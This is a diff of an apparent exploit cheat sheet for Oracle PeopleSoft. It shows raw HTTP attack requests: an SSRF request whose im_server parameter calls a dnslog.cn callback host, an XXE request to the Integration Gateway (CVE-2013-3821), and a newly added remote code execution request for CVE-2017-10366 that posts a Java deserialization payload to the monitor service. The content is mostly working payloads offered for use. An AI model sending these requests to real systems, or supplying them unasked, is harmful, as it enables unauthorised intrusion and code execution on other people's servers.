@@ -37,7 +37,7 @@ Content-type: text/xml
 GET /IMServlet?Method=GOOGLE_PRESENCE&im_to_user=abc&im_server_name=GOOGLE&im_server=k57si0.dnslog.cn:80/?param=var
 ```
 
-#### [CVE-2013-3821]  Integration Gateway HttpListeningConnector XXE
+#### [CVE-2013-3821]  Integration Gateway HttpListeningConnector XXE(8.51, 8.52, and 8.53?)
 ```http
 POST /PSIGW/HttpListeningConnector HTTP/1.1
 Host: website.com
@@ -74,7 +74,21 @@ Content-Type: application/xml
 </IBRequest>
 ```
 
-#### [CVE-2017-3546] SSRF
+#### [CVE-2017-10366] RCE vulnerability in monitor service of PeopleSoft 8.54, 8.55, 8.56
+```http
+POST /monitor/%SITE_NAME% HTTP/1.1
+Host: PeopleSoft:PORT
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0)
+Gecko/20100101 Firefox/51.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Cookie:a=aa
+
+§JAVA_SERIAL§
+
+%SITE_NAME% - is a PeopleSoft "name" to get it you can use some information
+```
 
 #### 直接部署Service
 ```bash
